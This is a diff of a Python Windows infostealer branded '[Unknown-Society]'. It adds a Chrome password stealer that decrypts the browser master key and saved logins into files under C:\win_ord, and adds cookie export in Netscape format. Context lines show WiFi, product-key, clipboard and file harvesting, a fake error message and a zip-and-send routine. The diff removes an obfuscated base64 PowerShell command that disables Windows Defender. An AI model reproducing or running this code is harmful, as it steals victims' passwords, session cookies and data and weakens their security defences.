@@ -8,8 +8,8 @@ from win32com.client import GetObject
 import shutil,subprocess,os,psutil,GPUtil,string,random,ctypes
 import threading,platform,win32api,time,zipfile,requests
 import json,base64,sqlite3,socket
-import winreg
-
+import winreg,re
+import win32crypt
 
 
 def get_files():
@@ -218,18 +218,16 @@ def get_browsers_details():
         os.makedirs(os.path.dirname("C:\\win_ord\\Browsers\\yandex"), exist_ok=True)
         os.makedirs(os.path.dirname("C:\\win_ord\\Browsers\\brave"), exist_ok=True)
         os.makedirs(os.path.dirname("C:\\win_ord\\Browsers\\iridium"), exist_ok=True)
+    
     def get_master_key(path: str):
         try:
             if not os.path.exists(path):
                 return
-
             if 'os_crypt' not in open(path + "\\Local State", 'r', encoding='utf-8').read():
                 return
-
             with open(path + "\\Local State", "r", encoding="utf-8") as f:
                 c = f.read()
             local_state = json.loads(c)
-
             master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
             master_key = master_key[5:]
             master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
@@ -318,6 +316,9 @@ def get_browsers_details():
         except:
             pass
 
+
+
+
     def get_cookies(path: str, profile: str, master_key):
         try:
             cookie_db = f'{path}\\{profile}\\Network\\Cookies'
@@ -333,7 +334,7 @@ def get_browsers_details():
                     continue
 
                 cookie = decrypt_password(row[3], master_key)
-
+                
                 result += f"""
                 ========================= [Unknown-Society] ============================
                 Host Key : {row[0]}
@@ -341,6 +342,9 @@ def get_browsers_details():
                 Path: {row[2]}
                 Cookie: {cookie}
                 Expires On: {row[4]}
+                
+                ============================
+                {row[0]}\tTRUE\t\t/FALSE\t2597573456\t{row[1]}\t{cookie}
                 ========================= [Unknown-Society] ============================
                 """
 
@@ -428,6 +432,77 @@ def get_browsers_details():
             pass
 
 
+def chrome_pass2():
+    CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
+    CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(os.environ['USERPROFILE']))
+
+    def get_secret_key():
+        try:
+            with open( CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
+                local_state = f.read()
+                local_state = json.loads(local_state)
+            secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+            secret_key = secret_key[5:] 
+            secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
+            return secret_key
+        except Exception as e:
+            return None
+        
+    def decrypt_payload(cipher, payload):
+        return cipher.decrypt(payload)
+
+    def generate_cipher(aes_key, iv):
+        return AES.new(aes_key, AES.MODE_GCM, iv)
+
+    def decrypt_password(ciphertext, secret_key):
+        try:
+            initialisation_vector = ciphertext[3:15]
+            encrypted_password = ciphertext[15:-16]
+            cipher = generate_cipher(secret_key, initialisation_vector)
+            decrypted_pass = decrypt_payload(cipher, encrypted_password)
+            decrypted_pass = decrypted_pass.decode()  
+            return decrypted_pass
+        except Exception as e:
+            pass
+        
+    def get_db_connection(chrome_path_login_db):
+        try:
+            shutil.copy2(chrome_path_login_db, "Loginvault.db") 
+            return sqlite3.connect("Loginvault.db")
+        except Exception as e:
+            pass
+            
+    if __name__ == '__main__':
+        try:
+            destination_path = "C:\\win_ord\\Browsers\\chrome\\password2.txt"
+            os.makedirs(os.path.dirname(destination_path), exist_ok=True)
+            with open(destination_path, 'w') as decrypt_password_file:
+                secret_key = get_secret_key()
+                
+                folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$",element)!=None]
+                for folder in folders:
+                    chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data"%(CHROME_PATH,folder))
+                    conn = get_db_connection(chrome_path_login_db)
+                    if(secret_key and conn):
+                        cursor = conn.cursor()
+                        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
+                        for index,login in enumerate(cursor.fetchall()):
+                            url = login[0]
+                            username = login[1]
+                            ciphertext = login[2]
+                            if(url!="" and username!="" and ciphertext!=""):
+                                decrypted_password = decrypt_password(ciphertext, secret_key)
+                                
+                                
+                                build = f"""========================= [Unknown-Society] ============================\nURL: {url}\nUsername: {username}\nPassword: {decrypted_password}\n========================= [Unknown-Society] ============================\n\n"""
+                                decrypt_password_file.write(build)
+                        cursor.close()
+                        conn.close()
+                        os.remove("Loginvault.db")
+        except Exception as e:
+            pass
+
+
 def is_admin():
     try:
         subprocess.check_call(["net", "session"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
@@ -472,6 +547,7 @@ def get_wifi():
         with open(destination_path,"a") as f:
             f.write(build)
 
+
 def get_productkey():
     destination_path = "C:\\win_ord\\product_key\\"+f"{os.getlogin()}_product_key.txt"
     os.makedirs(os.path.dirname(destination_path), exist_ok=True)
@@ -483,17 +559,8 @@ def get_productkey():
             f.write(str(build))
 
 
-def disable_defender():
-    try: 
-        cmd = base64.b64decode(b'cG93ZXJzaGVsbCBTZXQtTXBQcmVmZXJlbmNlIC1EaXNhYmxlSW50cnVzaW9uUHJldmVudGlvblN5c3RlbSAkdHJ1ZSAtRGlzYWJsZUlPQVZQcm90ZWN0aW9uICR0cnVlIC1EaXNhYmxlUmVhbHRpbWVNb25pdG9yaW5nICR0cnVlIC1EaXNhYmxlU2NyaXB0U2Nhbm5pbmcgJHRydWUgLUVuYWJsZUNvbnRyb2xsZWRGb2xkZXJBY2Nlc3MgRGlzYWJsZWQgLUVuYWJsZU5ldHdvcmtQcm90ZWN0aW9uIEF1ZGl0TW9kZSAtRm9yY2UgLU1BUFNSZXBvcnRpbmcgRGlzYWJsZWQgLVN1Ym1pdFNhbXBsZXNDb25zZW50IE5ldmVyU2VuZCAmJiBwb3dlcnNoZWxsIFNldC1NcFByZWZlcmVuY2UgLVN1Ym1pdFNhbXBsZXNDb25zZW50IDI=').decode() 
-        subprocess.run(cmd, shell=True, capture_output=True)
-    except:
-        pass
-
-
 def get_fakeerror(): 
     ctypes.windll.user32.MessageBoxW(None, 'Error code: 0x80070002\nAn internal error occurred while importing modules.', 'Fatal Error', 0)
-
 
 
 def generate_random_string(n):
@@ -534,7 +601,6 @@ def zip_and_send_out():
             pass
 
 
-
 def main():
     check_browser = "browser_id"
     check_clipb = "clipb_id"
@@ -548,6 +614,7 @@ def main():
     if __name__ == "__main__":
         if check_browser == "on":
             get_browsers_details()
+            chrome_pass2()
         if check_clipb == "on":
             get_clipb_data()
         if check_files == "on":
@@ -564,7 +631,6 @@ def main():
         if check_fakeerror == "on":
             get_fakeerror()
         
-        # 
 
     
 main()
